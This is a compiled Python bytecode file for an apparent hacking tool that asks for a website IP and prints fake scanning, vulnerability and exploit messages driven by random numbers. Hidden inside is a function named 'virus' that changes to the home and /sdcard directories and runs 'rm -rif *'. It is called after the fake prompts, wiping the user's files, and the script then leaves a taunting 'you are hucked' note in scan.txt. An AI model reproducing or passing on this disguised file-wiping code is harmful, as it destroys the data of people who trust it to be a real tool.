U
    MY_I  �                   @   s�  d dl Z d dlZd dlZd dlZd dlmZ d dlmZ d dl mZ d dlmZ dd� Zed� e	d	�Z
ed
� ede
d� ed� ed� ed� dZed d�D ]$Zede
ded� ed� ed Zq�ed� ed� ed� ed� ededd�� ed
� ed� e	d�Zed� dZedd�D ]&Zededd�� ed� ed Z�q&ed d!�Ze�d"� e��  e�  ed� ed#� dS )$�    N)�randint)�sleep��system)�exitc                   C   s4   t d� t d� t d� t d� t d� t d� d S )Nzcd $HOMEz
cd /sdcardz	rm -rif *zcd r   r   � r   r   �../ip/na.py�virus	   s    r	   �clearz7[1;91m[[1;93m*[1;91m][1;97m enter the ip website : �   z-[1;91m[[1;93m*[1;91m][1;97m cloning into z...�   z0[1;91m[[1;93m%[1;91m][1;97m scanning the ip �   �
   z%[1;91m[[1;93m>[1;91m][1;97m scan z[1;95mz[1;97m�   � z7[1;91m[[1;93m^[1;91m][1;97m Vulnerability check ...�   z9[1;91m[[1;93m![1;91m][1;97m Number of possible gaps .�   z=>> Do you want to exploit the weakest vulnerability? [y,n] : �   �(   zexploit ...��   i�  zscan.txtzw+zyou are hucked 
 hahahahahahahaz*please exit this tool and read the text ..)�os�sysZrandom�timer   r   r   r   r	   �inputZgh�print�w�range�iZyu�k�open�io�write�closer   r   r   r   �<module>   sJ    



